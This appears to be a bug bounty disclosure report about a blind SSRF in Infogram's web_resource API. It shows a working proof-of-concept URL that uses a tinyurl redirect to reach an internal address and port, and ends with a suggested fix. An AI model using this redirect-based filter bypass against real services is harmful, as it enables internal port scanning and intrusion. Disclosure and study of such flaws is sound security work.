# Internal Ports Scanning via Blind SSRF  (URL Redirection to beat filter)

## Original Report

Summary
---------------------
This is a blind SSRF that lets you scan internal ports.

Technical Details
--------------------
Inspired by #281950, I found a way to evade the filter for the api endpoint `web_resource` by using a URL Redirection service.  I used tinyurl to create a url that linked to http://0:6000/ (any port would work here).    

Proof of Concept
----------
https://infogram.com/api/web_resource/url?q=https://tinyurl.com/ybk7sqrg

[{"title":"Create Infographics, Charts and Maps - Infogram","description":"Infogram is an easy to use infographic and chart maker. Create and share beautiful infographics, online charts and interactive maps. Make your own here.","url":"http://0:6000/"}]
```

I'm not sure if that tinyurl sticks around, but it's trivial to make another one using the information above.

Mitigation
--------------
Alter your filter so that it follows redirects until it lands on an actual URL, then check that URL.
